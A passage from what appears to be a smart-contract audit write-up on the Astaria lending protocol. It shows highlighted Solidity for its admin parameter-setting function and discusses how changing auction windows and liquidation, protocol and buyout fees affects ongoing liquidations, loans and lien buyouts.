class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">buyoutFeeDenominator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">denominator</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MinInterestBPS</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">value</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">minInterestBPS</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">value</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MinDurationIncrease</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">value</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">minDurationIncrease</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">value</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MinEpochLength</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">minEpochLength</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)).</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MaxEpochLength</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">maxEpochLength</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)).</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MaxInterestRate</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">maxInterestRate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)).</span><span class=\"mtk11\">safeCastTo88</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">FeeTo</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">addr</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">addr</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidFileData</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">feeTo</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">StrategyValidator</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      (</span><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TYPE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">uint8</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">addr</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidFileData</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">strategyValidators</span><span class=\"mtk1\">[</span><span class=\"mtk12\">TYPE</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">UnsupportedFile</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FileUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">what</span><span class=\"mtk1\">, </span><span class=\"mtk12\">data</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>The parameters that can be changed are </p>\n<ul>\n<li><strong>the auction window and auction window buffer</strong></li>\n<li><strong>numerator and denominator for liquidation fee</strong></li>\n<li><strong>numerator and denominator for protocol fee</strong></li>\n<li><strong>numerator and denominator for buy out fee</strong></li>\n<li><strong>minInterestBPS, minDurationIncrease, and minEpochLength and maxEpochLength and MaxInterest rate</strong></li>\n</ul>\n<p>The rest of change is address change. The above change is the parameter related change.</p>\n<p>Now let us study the impact of adjusting these parameters:</p>\n<p><strong>Change auction window and auction window buffer does not affect old and ongoing liquidation because when the liquidation is created, the code take a snapshot of auctionWindowMax and apply to liquidation auction</strong></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"148\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auctionWindowMax</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionWindow</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionWindowBuffer</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">LIEN_TOKEN</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopLiens</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">].</span><span class=\"mtk12\">lien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">auctionWindowMax</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Liquidation</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">].</span><span class=\"mtk12\">lien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">position</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">listedOrder</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">COLLATERAL_TOKEN</span><span class=\"mtk1\">.</span><span class=\"mtk11\">auctionVault</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">ICollateralToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">AuctionVaultParams</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">settlementToken:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">].</span><span class=\"mtk12\">lien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">collateralId:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">].</span><span class=\"mtk12\">lien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">maxDuration:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auctionWindowMax</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">startingPrice:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">lien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">details</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidationInitialAsk</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">endingPrice:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1_000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wei</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Changing numerator and denominator for liquidation fee can affect ongoing liquidation before the liquidation is settled. The liquidation fee is adjust up before the liqudation is settled. The amount of payment may be not enough to pay the oustanding debt and lender can bear the loss.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"149\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">ILienToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">AuctionStack</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionStack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liquidatorPayment</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getLiquidatorFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">payment</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">paymentToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionStack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidator</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">liquidatorPayment</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">paymentToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeApprove</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\">.</span><span class=\"mtk11\">TRANSFER_PROXY</span><span class=\"mtk1\">()),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">payment</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">liquidatorPayment</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Changing numerator and denominator for protocol fee can does not impact on-going loan term because the old protocol fee is paid before.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"150\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_requestLienAndIssuePayout</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    IAstariaRouter.Commitment </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">c</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newLienId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ILienToken.Stack[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">slope</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payout</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_validateCommitment</span><span class=\"mtk1\">(</span><span class=\"mtk12\">c</span><span class=\"mtk1\">, </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">newLienId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">, </span><span class=\"mtk12\">slope</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">ROUTER</span><span class=\"mtk1\">().</span><span class=\"mtk11\">requestLienPosition</span><span class=\"mtk1\">(</span><span class=\"mtk12\">c</span><span class=\"mtk1\">, </span><span class=\"mtk11\">recipient</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">payout</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_handleProtocolFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">c</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienRequest</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payout</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_handleProtocolFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeTo</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ROUTER</span><span class=\"mtk1\">().</span><span class=\"mtk11\">feeTo</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeOn</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">feeTo</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">feeOn</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fee</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ROUTER</span><span class=\"mtk1\">().</span><span class=\"mtk11\">getProtocolFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">feeTo</span><span class=\"mtk1\">, </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>Changing buyout fee can impact ongoing lien buyout for sure. Inconsistent buyout fee can be paid in different buyoutLien transaction.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"151\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">   * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> Purchase a LienToken for its buyout price.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">   * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">params</span><span class=\"mtk3\"> The LienActionBuyout data specifying the lien position, receiver address, and underlying CollateralToken information of the lien.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">   */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">buyoutLien</span><span class=\"mtk1\">(ILienToken.LienActionBuyout </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">validateStack</span><span class=\"mtk1\">(params.encumber.lien.collateralId, params.encumber.stack)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">Stack</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Stack</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newStack</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">encumber</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">position</span><span class=\"mtk1\">].</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span 